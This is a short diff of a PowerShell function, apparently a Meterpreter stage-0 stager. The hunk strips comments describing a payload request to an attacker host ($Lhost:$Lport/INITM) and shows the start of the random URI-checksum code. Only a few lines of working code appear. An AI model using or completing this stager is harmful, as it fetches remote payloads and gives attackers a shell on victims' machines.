@@ -404,9 +404,7 @@ function Invoke-ps
             }
         }
         
-        # Meterpreter expects 'INITM' in the URI in order to initiate stage 0. Awesome authentication, huh?
-        # # $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
-        # # Write-Verbose "Requesting meterpreter payload from $Request"
+        # Meterpreter to initiate stage 0.
 	$chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
 	$x = ""
 		function sum($v){
